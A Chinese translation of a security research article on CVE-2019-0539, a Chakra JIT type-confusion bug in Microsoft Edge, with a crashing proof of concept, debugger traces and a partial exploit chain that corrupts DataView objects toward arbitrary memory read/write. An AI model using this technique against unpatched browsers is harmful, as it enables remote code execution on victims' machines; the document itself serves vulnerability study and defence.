# Microsoft Edge CVE-2019-0539 漏洞分析与利用

阅读量 **433347**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-03-19 16:30:56

 **x**

##### 译文声明

本文是翻译文章，文章原作者 perception-point，文章来源：perception-point.io

原文地址：<https://perception-point.io/resources/research/cve-2019-0539-root-cause-analysis/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t018b9d92152b7f570f.png)

## 前言

本文对Microsoft Edge的CVE-2019-0539漏洞进行了详细的分析，并利用漏洞实现完全的读写控制，最终实现RCE。

## 简介

微软在2019年1月的 Microsoft Edge Chakra Engine
[更新](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0539)中[修复](https://github.com/Microsoft/ChakraCore/commit/788f17b0ce06ea84553b123c174d1ff7052112a0)了CVE-2019-0539漏洞。该漏洞和其他两个漏洞由Google
Project Zero的Lokihardt 发现并[报告](https://bugs.chromium.org/p/project-zero/issues/detail?id=1702)。该漏洞可以通过访问恶意网页导致远程代码执行。正如Lokihardt所述，当Chakra JIT
javascript编译器生成的代码不经意间发生了对象类型转换，并且错误地认为这种转换后续对该对象没有影响，这时就会发生类型混淆漏洞。Chakra开发团队的Abhijith
Chatra在其博客中讲到，动态类型对象包含一个property map和一个slot array。property map用来掌握一个对象属性在slot
array中的索引，而slot array则存储属性的真实数据。CVE-2019-0539会引发JIT代码的内存对象混淆，从而导致slot
array指针被任意数据覆写。

## 漏洞根源分析

###  设置

设置好windows的ChakraCore漏洞版本：

<https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore>

(在Visual Studio MSBuild命令提示符中)

    
    
    c:code>git clone https://github.com/Microsoft/ChakraCore.git
    c:code>cd ChakraCore
    c:codeChakraCore>git checkout 331aa3931ab69ca2bd64f7e020165e693b8030b5
    c:codeChakraCore>msbuild /m /p:Platform=x64 /p:Configuration=Debug BuildChakra.Core.sln
    

###  Time Travel Debugging

本篇文章将使用 **TTD (Time Travel Debugging)** ，微软官方文档介绍如下：

> Time Travel Debugging是一款调试器工具，允许你记录正在运行进程的执行轨迹，然后向前、向后进行重放。 Time Travel
> Debugging (TTD) 可以让你“回放”调试器会话，而不必重新启动触发错误，从而帮助你更轻松的调试解决各种问题。

从[Microsoft Store](https://www.microsoft.com/en-us/p/windbg-preview/9pgjgd53tn86?activetab=pivot:overviewtab)下载安装最新版的Windbg。

运行时记得要以管理员身份运行。

![](https://p4.ssl.qhimg.com/t01cc42cdf038775963.jpg)

###  根源分析

Poc:

    
    
    function opt(o, c, value) {
        o.b = 1;
        class A extends c { // may transition the object
        }
        o.a = value; // overwrite slot array pointer
    }
    function main() {
        for (let i = 0; i < 2000; i++) {
            let o = {a: 1, b: 2};
            opt(o, (function () {}), {});
        }
    
        let o = {a: 1, b: 2};
        let cons = function () {};
    
        cons.prototype = o; // causes "class A extends c" to transition the object type
        opt(o, cons, 0x1234);
        print(o.a); // access the slot array pointer resulting in a crash
    }
    main();
    

利用[TTD启动调试分析](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/time-travel-debugging-record#HOWTORECORD)，直到其发生Crash然后执行如下命令：

    
    
    0:005> !tt 0
    Setting position to the beginning of the trace
    Setting position: 14:0
    (1e8c.4bc8): Break instruction exception - code 80000003 (first/second chance not available)
    Time Travel Position: 14:0
    ntdll!LdrInitializeThunk:
    00007fff`03625640 4053            push    rbx
    0:000> g
    ModLoad: 00007fff`007e0000 00007fff`0087e000   C:WindowsSystem32sechost.dll
    ModLoad: 00007fff`00f40000 00007fff`00fe3000   C:WindowsSystem32advapi32.dll
    ModLoad: 00007ffe`ffde0000 00007ffe`ffe00000   C:WindowsSystem32win32u.dll
    ModLoad: 00007fff`00930000 00007fff`00ac7000   C:WindowsSystem32USER32.dll
    ModLoad: 00007ffe`ff940000 00007ffe`ffada000   C:WindowsSystem32gdi32full.dll
    ModLoad: 00007fff`02e10000 00007fff`02e39000   C:WindowsSystem32GDI32.dll
    ModLoad: 00007fff`03420000 00007fff`03575000   C:WindowsSystem32ole32.dll
    ModLoad: 00007ffe`ffdb0000 00007ffe`ffdd6000   C:WindowsSystem32bcrypt.dll
    ModLoad: 00007ffe`e7c20000 00007ffe`e7e0d000   C:WindowsSYSTEM32dbghelp.dll
    ModLoad: 00007ffe`e7bf0000 00007ffe`e7c1a000   C:WindowsSYSTEM32dbgcore.DLL
    ModLoad: 00007ffe`9bf10000 00007ffe`9dd05000   c:ppChakraCoreBuildVcBuildbinx64_debugchakracore.dll
    ModLoad: 00007fff`011c0000 00007fff`011ee000   C:WindowsSystem32IMM32.DLL
    ModLoad: 00007ffe`ff5b0000 00007ffe`ff5c1000   C:WindowsSystem32kernel.appcore.dll
    ModLoad: 00007ffe`f0f80000 00007ffe`f0fdc000   C:WindowsSYSTEM32Bcp47Langs.dll
    ModLoad: 00007ffe`f0f50000 00007ffe`f0f7a000   C:WindowsSYSTEM32bcp47mrm.dll
    ModLoad: 00007ffe`f0fe0000 00007ffe`f115b000   C:WindowsSYSTEM32windows.globalization.dll
    ModLoad: 00007ffe`ff010000 00007ffe`ff01c000   C:WindowsSYSTEM32CRYPTBASE.DLL
    (1e8c.20b8): Access violation - code c0000005 (first/second chance not available)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    Time Travel Position: 90063:0
    chakracore!Js::DynamicTypeHandler::GetSlot+0x149:
    00007ffe`9cd1ec79 488b04c1        mov     rax,qword ptr [rcx+rax*8] ds:00010000`00001234=????????????????
    0:004> ub
    chakracore!Js::DynamicTypeHandler::GetSlot+0x12d [c:ppchakracorelibruntimetypestypehandler.cpp @ 96]:
    00007ffe`9cd1ec5d 488b442450      mov     rax,qword ptr [rsp+50h]
    00007ffe`9cd1ec62 0fb74012        movzx   eax,word ptr [rax+12h]
    00007ffe`9cd1ec66 8b4c2460        mov     ecx,dword ptr [rsp+60h]
    00007ffe`9cd1ec6a 2bc8            sub     ecx,eax
    00007ffe`9cd1ec6c 8bc1            mov     eax,ecx
    00007ffe`9cd1ec6e 4898            cdqe
    00007ffe`9cd1ec70 488b4c2458      mov     rcx,qword ptr [rsp+58h] // object pointer
    00007ffe`9cd1ec75 488b4910        mov     rcx,qword ptr [rcx+10h] // slot array pointer
    0:004> ba w 8 poi(@rsp+58)+10
    0:004> g-    Breakpoint 1 hit
    Time Travel Position: 9001D:178A
    00000195`cc9c0159 488bc7          mov     rax,rdi
    

下面是最终阶段覆写slot
array指针的JIT代码。注意`chakracore!Js::JavascriptOperators::OP_InitClass`的调用。正如Lokihardt解释的那样，这个函数最终将会调用SetIsPrototype，从而转换对象类型。

    
    
    0:004> ub @rip L20
    00000195`cc9c00c6 ef              out     dx,eax
    00000195`cc9c00c7 0000            add     byte ptr [rax],al
    00000195`cc9c00c9 004c0f45        add     byte ptr [rdi+rcx+45h],cl
    00000195`cc9c00cd f249895e18      repne mov qword ptr [r14+18h],rbx
    00000195`cc9c00d2 4c8bc7          mov     r8,rdi
    00000195`cc9c00d5 498bcf          mov     rcx,r15
    00000195`cc9c00d8 48baf85139ca95010000 mov rdx,195CA3951F8h
    00000195`cc9c00e2 48b8d040a39cfe7f0000 mov rax,offset chakracore!Js::ScriptFunction::OP_NewScFuncHomeObj (00007ffe`9ca340d0)
    00000195`cc9c00ec 48ffd0          call    rax
    00000195`cc9c00ef 488bd8          mov     rbx,rax
    00000195`cc9c00f2 498bd5          mov     rdx,r13
    00000195`cc9c00f5 488bcb          mov     rcx,rbx
    00000195`cc9c00f8 c60601          mov     byte ptr [rsi],1
    00000195`cc9c00fb 49b83058e8c995010000 mov r8,195C9E85830h
    00000195`cc9c0105 48b88041679cfe7f0000 mov rax,offset chakracore!Js::JavascriptOperators::OP_InitClass (00007ffe`9c674180) // transitions the type of the object 
    00000195`cc9c010f 48ffd0          call    rax
    00000195`cc9c0112 803e01          cmp     byte ptr [rsi],1
    00000195`cc9c0115 0f85dc000000    jne     00000195`cc9c01f7
    00000195`cc9c011b 488bc3          mov     rax,rbx
    00000195`cc9c011e 48c1e830        shr     rax,30h
    00000195`cc9c0122 0f85eb000000    jne     00000195`cc9c0213
    00000195`cc9c0128 4c8b6b08        mov     r13,qword ptr [rbx+8]
    00000195`cc9c012c 498bc5          mov     rax,r13
    00000195`cc9c012f 48c1e806        shr     rax,6
    00000195`cc9c0133 4883e007        and     rax,7
    00000195`cc9c0137 48b9b866ebc995010000 mov rcx,195C9EB66B8h
    00000195`cc9c0141 33d2            xor     edx,edx
    00000195`cc9c0143 4c3b2cc1        cmp     r13,qword ptr [rcx+rax*8]
    00000195`cc9c0147 0f85e2000000    jne     00000195`cc9c022f
    00000195`cc9c014d 480f45da        cmovne  rbx,rdx
    00000195`cc9c0151 488b4310        mov     rax,qword ptr [rbx+10h]
    00000195`cc9c0155 4d896610        mov     qword ptr [r14+10h],r12 // trigger of CVE-2019-0539. Overridden slot array pointer
    

下面是在JIT代码调用`OP_InitClass`前的对象的内存dump。注意两个对象slots是如何在对象内存中内联（而不是存储在独立的slot
array中）。

    
    
    Time Travel Position: 8FE48:C95
    chakracore!Js::JavascriptOperators::OP_InitClass:
    00007ffe`9c674180 4c89442418      mov     qword ptr [rsp+18h],r8 ss:00000086`971fd710=00000195ca395030
    0:004> dps 00000195`cd274440
    00000195`cd274440  00007ffe`9d6e1790 chakracore!Js::DynamicObject::`vftable'
    00000195`cd274448  00000195`ca3c1d40
    00000195`cd274450  00010000`00000001 // inline slot 1
    00000195`cd274458  00010000`00000001 // inline slot 2
    00000195`cd274460  00000195`cd274440
    00000195`cd274468  00010000`00000000
    00000195`cd274470  00000195`ca3b4030
    00000195`cd274478  00000000`00000000
    00000195`cd274480  00000195`cd073ed0
    00000195`cd274488  00000000`00000000
    00000195`cd274490  00000000`00000000
    00000195`cd274498  00000000`00000000
    00000195`cd2744a0  00000195`cd275c00
    00000195`cd2744a8  00010000`00000000
    00000195`cd2744b0  00000195`ca3dc100
    00000195`cd2744b8  00000000`00000000
    

下面的调用栈表明`OP_InitClass`最终会调用`SetIsPrototype`，从而触发对象类型转换。这种转换导致两个slots不再内联，而是存储在slot
array中。而且这种转换在随后会被JIT代码所忽略。

    
    
    0:004> kb
     # RetAddr           : Args to Child                                                           : Call Site
    00 00007ffe`9cd0dace : 00000195`cd274440 00000195`ca3a0000 00000195`00000004 00007ffe`9bf6548b : chakracore!Js::DynamicTypeHandler::AdjustSlots+0x79f [c:ppchakracorelibruntimetypestypehandler.cpp @ 755] 
    01 00007ffe`9cd24181 : 00000195`cd274440 00000195`cd264f60 00000195`000000fb 00007ffe`9c200002 : chakracore!Js::DynamicObject::DeoptimizeObjectHeaderInlining+0xae [c:ppchakracorelibruntimetypesdynamicobject.cpp @ 591] 
    02 00007ffe`9cd2e393 : 00000195`ca3da0f0 00000195`cd274440 00000195`00000002 00007ffe`9cd35f00 : chakracore!Js::PathTypeHandlerBase::ConvertToSimpleDictionaryType<Js::SimpleDictionaryTypeHandlerBase >+0x1b1 [c:ppchakracorelibruntimetypespathtypehandler.cpp @ 1622] 
    03 00007ffe`9cd40ac2 : 00000195`ca3da0f0 00000195`cd274440 00000000`00000002 00007ffe`9bf9fe00 : chakracore!Js::PathTypeHandlerBase::TryConvertToSimpleDictionaryType<Js::SimpleDictionaryTypeHandlerBase >+0x43 [c:ppchakracorelibruntimetypespathtypehandler.cpp @ 1598] 
    04 00007ffe`9cd3cf81 : 00000195`ca3da0f0 00000195`cd274440 00000195`00000002 00007ffe`9cd0c700 : chakracore!Js::PathTypeHandlerBase::TryConvertToSimpleDictionaryType+0x32 [c:ppchakracorelibruntimetypespathtypehandler.h @ 297] 
    05 00007ffe`9cd10a9f : 00000195`ca3da0f0 00000195`cd274440 00000001`0000001c 00007ffe`9c20c563 : chakracore!Js::PathTypeHandlerBase::SetIsPrototype+0xe1 [c:ppchakracorelibruntimetypespathtypehandler.cpp @ 2892] 
    06 00007ffe`9cd0b7a3 : 00000195`cd274440 00007ffe`9bfa722e 00000195`cd274440 00007ffe`9bfa70a3 : chakracore!Js::DynamicObject::SetIsPrototype+0x23f [c:ppchakracorelibruntimetypesdynamicobject.cpp @ 680] 
    07 00007ffe`9cd14b08 : 00000195`cd274440 00007ffe`9c20d013 00000195`cd274440 00000195`00000119 : chakracore!Js::RecyclableObject::SetIsPrototype+0x43 [c:ppchakracorelibruntimetypesrecyclableobject.cpp @ 190] 
    08 00007ffe`9c6743ea : 00000195`cd275c00 00000195`cd274440 0000018d`00000119 00000195`c9e85830 : chakracore!Js::DynamicObject::SetPrototype+0x18 [c:ppchakracorelibruntimetypesdynamictype.cpp @ 632] 
    09 00000195`cc9c0112 : 00000195`cd264f60 00000195`cd273eb0 00000195`c9e85830 00007ffe`9c20c9b3 : chakracore!Js::JavascriptOperators::OP_InitClass+0x26a [c:ppchakracorelibruntimelanguagejavascriptoperators.cpp @ 7532] 
    0a 00007ffe`9cbea0d2 : 00000195`ca3966e0 00000000`10000004 00000195`ca395030 00000195`cd274440 : 0x00000195`cc9c0112
    

下面是`OP_InitClass`调用后，对象的内存dump。可以观察到，对象已经被转换并且两个slots不再内联。但是，后续的JIT代码仍然会认为slots是内联的。

    
    
    Time Travel Position: 9001D:14FA
    00000195`cc9c0112 803e01          cmp     byte ptr [rsi],1 ds:0000018d`c8e72018=01
    0:004> dps 00000195`cd274440
    00000195`cd274440  00007ffe`9d6e1790 chakracore!Js::DynamicObject::`vftable'
    00000195`cd274448  00000195`cd275d40
    00000195`cd274450  00000195`cd2744c0 // slot array pointer (previously inline slot 1)
    00000195`cd274458  00000000`00000000
    00000195`cd274460  00000195`cd274440
    00000195`cd274468  00010000`00000000
    00000195`cd274470  00000195`ca3b4030
    00000195`cd274478  00000195`cd277000
    00000195`cd274480  00000195`cd073ed0
    00000195`cd274488  00000195`cd073f60
    00000195`cd274490  00000195`cd073f90
    00000195`cd274498  00000000`00000000
    00000195`cd2744a0  00000195`cd275c00
    00000195`cd2744a8  00010000`00000000
    00000195`cd2744b0  00000195`ca3dc100
    00000195`cd2744b8  00000000`00000000
    0:004> dps 00000195`cd2744c0 // slot array
    00000195`cd2744c0  00010000`00000001
    00000195`cd2744c8  00010000`00000001
    00000195`cd2744d0  00000000`00000000
    00000195`cd2744d8  00000000`00000000
    00000195`cd2744e0  00000119`00000000
    00000195`cd2744e8  00000000`00000100
    00000195`cd2744f0  00000195`cd074000
    00000195`cd2744f8  00000000`00000000
    00000195`cd274500  000000c4`00000000
    00000195`cd274508  00000000`00000102
    00000195`cd274510  00000195`cd074030
    00000195`cd274518  00000000`00000000
    00000195`cd274520  000000fb`00000000
    00000195`cd274528  00000000`00000102
    00000195`cd274530  00000195`cd074060
    00000195`cd274538  00000000`00000000
    

下面是JIT错误地分配了属性值、覆写 slot array 指针后的对象内存dump：

    
    
    0:004> dqs 00000195cd274440
    00000195`cd274440  00007ffe`9d6e1790 chakracore!Js::DynamicObject::`vftable'
    00000195`cd274448  00000195`cd275d40
    00000195`cd274450  00010000`00001234 // overridden slot array pointer (CVE-2019-0539)
    00000195`cd274458  00000000`00000000
    00000195`cd274460  00000195`cd274440
    00000195`cd274468  00010000`00000000
    00000195`cd274470  00000195`ca3b4030
    00000195`cd274478  00000195`cd277000
    00000195`cd274480  00000195`cd073ed0
    00000195`cd274488  00000195`cd073f60
    00000195`cd274490  00000195`cd073f90
    00000195`cd274498  00000000`00000000
    00000195`cd2744a0  00000195`cd275c00
    00000195`cd2744a8  00010000`00000000
    00000195`cd2744b0  00000195`ca3dc100
    00000195`cd2744b8  00000000`00000000
    

最终，当访问一个对象的属性时，被覆写的 slot array 指针将会被取消引用，从而导致Crash

    
    
    0:004> g
    (1e8c.20b8): Access violation - code c0000005 (first/second chance not available)
    First chance exceptions are reported before any exception handling.
    chakracore!Js::DynamicTypeHandler::GetSlot+0x149:
    00007ffe`9cd1ec79 488b04c1        mov     rax,qword ptr [rcx+rax*8] ds:00010000`00001234=????????????????
    

###  思考

由于Windbg添加的TTD，简化了调试过程。具体而言就是指设置断点、反向运行程序直到覆写slot
array指针的能力。这项功能确实展示了CPU跟踪和执行重建的能力，可用于软件调试以及逆向工程。

## 漏洞利用

###  简介

前文介绍了CVE-2019-0539漏洞的根源，本部分将继续研究如何实现完全的读写控制并最终实现RCE。这里需要重点注意的是：由于Microsoft
Edge引入了沙箱技术，因此为完全破坏系统，我们需要一个额外的漏洞来实现沙箱逃逸。

这里，我们要感谢 Lokihardt 和 Bruno Keith 在这一领域的惊人研究成果，他们的研究成果对我们下文的研究具有重要价值。

###  漏洞利用

由上一章的分析可知，该漏洞让我们能够实现覆写 javascript 对象的slot array指针。借鉴Bruno Keith在BlackHat 2019
上[提出](https://www.youtube.com/watch?v=lBL4KGIybWE)的奇妙的[研究成果](https://github.com/bkth/Attacking-Edge-Through-the-JavaScript-Compiler)，我们可以得知，在Chakra中，javascript 对象(`o={a: 1,
b: 2};`)是在`Js::DynamicObject`类中实现的，且可能有不同的内存布局，其属性 slot array
指针被称之为`auxSlots`。从`DynamicObject`类定义（位于`libRuntimeTypesDynamicObject.h`）中，可以得知Bruno
所讨论的三种可能的内存布局规范：

    
    
    // Memory layout of DynamicObject can be one of the following:
    //        (#1)                (#2)                (#3)
    //  +--------------+    +--------------+    +--------------+
    //  | vtable, etc. |    | vtable, etc. |    | vtable, etc. |
    //  |--------------|    |--------------|    |--------------|
    //  | auxSlots     |    | auxSlots     |    | inline slots |
    //  | union        |    | union        |    |              |
    //  +--------------+    |--------------|    |              |
    //                      | inline slots |    |              |
    //                      +--------------+    +--------------+
    // The allocation size of inline slots is variable and dependent on profile data for the
    // object. The offset of the inline slots is managed by DynamicTypeHandler.
    

因此，一个对象只可能有以下三种情况：

  1. 拥有一个`auxSlots`指针、没有内联`slots` （#1）
  2. 拥有一个内联`slots`但没有`auxSlots`指针（#3），
  3. 同时拥有一个`auxSlots`指针、一个内联`slots`（#2）

在[CVE-2019-0539 PoC](https://bugs.chromium.org/p/project-zero/issues/detail?id=1703&desc=2)中，对象`o`以（#3）形式的内存布局开始其生命周期。然后，当JIT代码最后一次调用`OP_InitClass`函数时，对象`o`的内存布局就变更为（#1）。JIT代码在调用`OP_InitClass`函数之前和之后关于`o`的精确内存布局如下：

    
    
        Before:                              After:
    +---------------+                   +--------------+   +--->+--------------+
    |    vtable     |                   |    vtable    |   |    |    slot 1    | // o.a
    +---------------+                   +--------------+   |    +--------------+
    |     type      |                   |     type     |   |    |    slot 2    | // o.b
    +---------------+                   +--------------+   |    +--------------+
    | inline slot 1 | // o.a            |   auxSlots   +---+    |    slot 3    |
    +---------------+                   +--------------+        +--------------+
    | inline slot 2 | // o.b            |  objectArray |        |    slot 4    |
    +---------------+                   +--------------+        +--------------+
    

在`OP_InitClass`调用前，`o.a`位于第一个内联`slot`中；调用后，它位于`slot
1`的`auxSlots`数组中。因此，正如在上述漏洞根源分析中提到的，JIT代码试图用0x1234来更新位于第一个内联`slot`中的`o.a`，但是它并不知道对象的内存布局已经发生了改变，因而它实际覆写了`auxSlots`指针。

现在，为了利用漏洞实现完全读写原语，参照Bruno的研究，我们需要破坏一些其他有用的对象，并以此实现内存中的任意地址读写。首先，我们需要更好地理解该漏洞的利用价值。当我们覆写`DynamicObject`的`auxSlots`指针时，我们就可以“处理”放入`auxSlots`中的内容来作为`auxSlots
array`。因此举例而言，如果我们利用该漏洞将`auxSlots`指向一个`JavascriptArray`，如下所示：

    
    
    some_array = [{}, 0, 1, 2];
    ...
    opt(o, cons, some_array); // o->auxSlots = some_array
    

然后，我们可以通过赋予`o`属性来覆写`some_array
JavascriptArray`对象内存。使用漏洞覆盖后的`auxSlots`内存状态图如下所示：

    
    
          o                        some_array
    +--------------+   +--->+---------------------+
    |    vtable    |   |    |       vtable        | // o.a
    +--------------+   |    +---------------------+
    |     type     |   |    |        type         | // o.b
    +--------------+   |    +---------------------+
    |   auxSlots   +---+    |      auxSlots       | // o.c?
    +--------------+        +---------------------+
    |  objectArray |        |     objectArray     | // o.d?
    +--------------+        |- - - - - - - - - - -|
                            |      arrayFlags     |
                            |  arrayCallSiteIndex |
                            +---------------------+
                            |       length        | // o.e??
                            +---------------------+
                            |        head         | // o.f??
                            +---------------------+
                            |    segmentUnion     | // o.g??
                            +---------------------+
                            |        ....         |
                            +---------------------+
    

因此，理论而言，如果我们想要覆写数组的长度，我们可以通过类似`o.e =
0xFFFFFFFF`的操作，然后使用`some_array[1000]`来从数据基址区访问一些远程地址。但是，这里有几点需要考虑的问题：

  1. 除了`a`和`b`以外的其他属性都未定义。这意味着要想实现右侧`slot`中`o.e`的定义，我们首先需要分配其他的所有属性，这样的操作会破坏更多的内存，导致数组无法使用。
  2. 原始的`auxSlots array`并不够大。它初始仅分配了4个`slots`。如果我们定义更多的属性，`Js::DynamicTypeHandler::AdjustSlots`函数会分配一个新的`slots array`，并将`auxSlots`指向它，而不是我们的`JavascriptArray`对象。
  3. 我们原计划在`JavascriptArray`对象的`length`字段中放入的0xFFFFFFFF数值并不会被如期写入。Chakra使用所谓的标记数字，因此将要写入的数字将会是`boxed`（更多解释请参照[Chartra的文章](https://abchatra.github.io/TaggedFloat/)）
  4. 即便我们能够在避免破坏其余内存的同时，将`length`字段覆写为较大数值。这也只会给我们一个“相对的”读写原语（相对于数组基址），比起完全的读写原语这显然是不够强大的。
  5. 实际上，覆写`JavascriptArray`的`length`字段并不是很有用的，它也不会得到我们期望实现的相对读写原语。在这种特殊情况下需要做的就是破坏`array`的段大小，这里不会详细探讨。尽管如此，让我们假设覆写`length`字段是有用的，因为它很好地展示了漏洞利用的微妙之处。

因此，我们需要一些特殊的技巧来克服上述问题。我们先来讨论问题1和2。首先想到的就是在漏洞触发前，在`o`对象中提前预定义更多的属性。然后，当覆写`auxSlots`指针时，我们已经在正确的`slot`中定义了`o.e`，该`slot`对应于数组的`length`字段。不幸的是，当增加更多的属性时，会发生以下两种情况之一：

  * 我们过早的更改了内存对象布局（#1），从而阻止了漏洞发生，因为不再有机会覆写`auxSlots`指针。
  * 我们创建了更多的内联`slots`，并且在漏洞触发后仍然保持内联。该对象最终布局（#2），有大量的属性位于新的内联`slots`中。因此在所谓的`auxSlots array`即`some_array`对象内存中，我们仍然无法做到多于2个`slot`。

Bruno
Keith在他的演讲中提出了一个巧妙的方法来同时解决问题1和2。我们首先破坏预先准备好的具有多个属性的另一个`DynamicObject`，而不是直接破坏目标对象（我们示例中的`JavascriptArray`），其已经在内存布局中（#1）。

    
    
    obj = {}
    obj.a = 1;
    obj.b = 2;  
    obj.c = 3;
    obj.d = 4;
    obj.e = 5;
    obj.f = 6;
    obj.g = 7;
    obj.h = 8;
    obj.i = 9;
    obj.j = 10;
    
    some_array = [{}, 0, 1, 2];
    ...
    
    opt(o, cons, obj); // o->auxSlots = obj
    
    o.c = some_array; // obj->auxSlots = some_array
    

我们观察一下在执行`o.c = some_array;`前后的内存状态：

    
    
    Before:
           o                      obj
    +--------------+   +--->+--------------+        +->+--------------+
    |    vtable    |   |    |    vtable    | //o.a  |  |    slot 1    | // obj.a
    +--------------+   |    +--------------+        |  +--------------+ 
    |     type     |   |    |     type     | //o.b  |  |    slot 2    | // obj.b
    +--------------+   |    +--------------+        |  +--------------+ 
    |   auxSlots   +---+    |   auxSlots   +--------+  |    slot 3    | // obj.c
    +--------------+        +--------------+           +--------------+ 
    |  objectArray |        |  objectArray |           |    slot 4    | // obj.d
    +--------------+        +--------------+           +--------------+ 
                                                       |    slot 5    | // obj.e
                                                       +--------------+ 
                                                       |    slot 6    | // obj.f
                                                       +--------------+ 
                                                       |    slot 7    | // obj.g
                                                       +--------------+
                                                       |    slot 8    | // obj.h
                                                       +--------------+
                                                       |    slot 9    | // obj.i
                                                       +--------------+
                                                       |    slot 10   | // obj.j
                                                       +--------------+
    
    After:
           o                      obj                        some_array
    +--------------+   +--->+--------------+        +->+---------------------+
    |    vtable    |   |    |    vtable    | //o.a  |  |       vtable        | // obj.a
    +--------------+   |    +--------------+        |  +---------------------+
    |     type     |   |    |     type     | //o.b  |  |        type         | // obj.b
    +--------------+   |    +--------------+        |  +---------------------+
    |   auxSlots   +---+    |   auxSlots   +-//o.c--+  |      auxSlots       | // obj.c
    +--------------+        +--------------+           +---------------------+
    |  objectArray |        |  objectArray |           |     objectArray     | // obj.d
    +--------------+        +--------------+           |- - - - - - - - - - -|
                                                       |      arrayFlags     |
                                                       |  arrayCallSiteIndex |
                                                       +---------------------+
                                                       |       length        | // obj.e
                                                       +---------------------+
                                                       |        head         | // obj.f
                                                       +---------------------+
                                                       |    segmentUnion     | // obj.g
                                                       +---------------------+
                                                       |        ....         |
                                                       +---------------------+
    

此时，执行`obj.e =
0xFFFFFFFF`实际上会替换`some_array`对象的`length`字段。然而，问题3中提到，这个数值并不会如期原样写入，而是以其`boxed`形式写入。即便我们忽略问题3，问题4和5仍然会导致我们选择的对象失效。因此，我们应该选择另外一个对象进行破坏。Bruno在他的漏洞利用中巧妙地使用了`ArrayBuffer`对象，但不幸的是，在提交cf71a962c1ce0905a12cb3c8f23b6a37987e68df（10月份的1809合并更新）中，`ArrayBuffer`对象的内存布局发生了改变。它没有直接指向数据缓冲区，而是通过`bufferContent`字段指向一个名为`RefCountedBuffer`的中间结构，只有该结构指向实际的数据。因此，需要不同的解决方法。

最终，我们提出破坏`DataView`对象的想法，该对象实际上在内部使用了`ArrayBuffer`。因此，它具备与使用`ArrayBuffer`相同的优点，并且它直接指向`ArrayBuffer`的底层数据缓冲区。这里是被`ArrayBuffer`初始化的`DataView`对象的内存布局（`v
= new DataView(new ArrayBuffer(0x100));`）。

    
    
                                                                                                 actual
          DataView                       ArrayBuffer                                             buffer
    +---------------------+   +--->+---------------------+            RefCountedBuffer      +--->+----+
    |       vtable        |   |    |       vtable        |   +--->+---------------------+   |    |    |
    +---------------------+   |    +---------------------+   |    |       buffer        |---+    +----+
    |        type         |   |    |        type         |   |    +---------------------+   |    |    |
    +---------------------+   |    +---------------------+   |    |      refCount       |   |    +----+
    |      auxSlots       |   |    |      auxSlots       |   |    +---------------------+   |    |    |
    +---------------------+   |    +---------------------+   |                              |    +----+
    |     objectArray     |   |    |     objectArray     |   |                              |    |    |
    |- - - - - - - - - - -|   |    |- - - - - - - - - - -|   |                              |    +----+
    |      arrayFlags     |   |    |      arrayFlags     |   |                              |    |    |
    |  arrayCallSiteIndex |   |    |  arrayCallSiteIndex |   |                              |    +----+
    +---------------------+   |    +---------------------+   |                              |    |    |
    |       length        |   |    |      isDetached     |   |                              |    +----+
    +---------------------+   |    +---------------------+   |                              |    |    |
    |     arrayBuffer     |---+    |     primaryParent   |   |                              |    +----+
    +---------------------+        +---------------------+   |                              |    |    |
    |     byteOffset      |        |     otherParents    |   |                              |    +----+
    +---------------------+        +---------------------+   |                              |    |    |
    |       buffer        |---+    |     bufferContent   |---+                              |    +----+
    +---------------------+   |    +---------------------+                                  |    |    |
                              |    |     bufferLength    |                                  |    +----+
                              |    +---------------------+                                  |
                              |                                                             |
                              +-------------------------------------------------------------+
    

正如所示，`DataView`对象指向了`ArrayBuffer`对象。`ArrayBuffer`指向了前面提到的`RefCountedBuffer`对象，后者又指向了内存中的实际数据缓冲区。然而，观察到`DataView`对象也指向了实际数据缓冲区。如果我们覆写`DataView`对象的缓冲区字段为我们的指针，我们则会根据所需得到所需的绝对读写原语。我们的障碍只剩问题3了——我们无法用已被破坏的`DynamicObject`来在内存中写入普通数字（被标记的数字…）。但现在，由于`DataView`对象允许我们在其指向的缓冲区内写入普通数字（详细信息可参考DataView
“API”
）。再次受到Bruno的启发，我们有两个`DataView`对象，其中第一个指向第二个，至此我们清楚地知道下一步的破坏方式。这将解决最后一个问题，并且给予我们想要的绝对读写原语。

让我们回看整个漏洞利用过程。可以参考下面的说明（省略了我们不关心的对象）

    
    
           o                  obj                     DataView #1 - dv1                   DataView #2 - dv2
    +--------------+ +->+--------------+        +->+---------------------+          +->+---------------------+  +--> 0x????
    |    vtable    | |  |    vtable    | //o.a  |  |       vtable        | //obj.a  |  |       vtable        |  |       
    +--------------+ |  +--------------+        |  +---------------------+          |  +---------------------+  |       
    |     type     | |  |     type     | //o.b  |  |        type         | //obj.b  |  |        type         |  |       
    +--------------+ |  +--------------+        |  +---------------------+          |  +---------------------+  |       
    |   auxSlots   +-+  |   auxSlots   +-//o.c--+  |      auxSlots       | //obj.c  |  |      auxSlots       |  |       
    +--------------+    +--------------+           +---------------------+          |  +---------------------+  |       
    |  objectArray |    |  objectArray |           |     objectArray     | //obj.d  |  |     objectArray     |  |       
    +--------------+    +--------------+           |- - - - - - - - - - -|          |  |- - - - - - - - - - -|  |       
                                                   |      arrayFlags     |          |  |      arrayFlags     |  |       
                                                   |  arrayCallSiteIndex |          |  |  arrayCallSiteIndex |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |       length        | //obj.e  |  |       length        |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |     arrayBuffer     | //obj.f  |  |     arrayBuffer     |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |     byteOffset      | //obj.g  |  |     byteOffset      |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |       buffer        |-//obj.h--+  |       buffer        |--+//dv1.setInt32(0x38,0x??,true);
                                                   +---------------------+             +---------------------+   //dv1.setInt32(0x3C,0x??,true);
    

  1. 触发漏洞将`'o'auxSlots`设置为`'obj'(opt(o, cons, obj);)`
  2. 用`o`将`obj`设置为第一个`DataView (o.c = dv1;)`
  3. 用`obj`设置第一个`DataView（'dv1'）`缓冲区字段为第二个`DataView`对象(`obj.h = dv2;`)
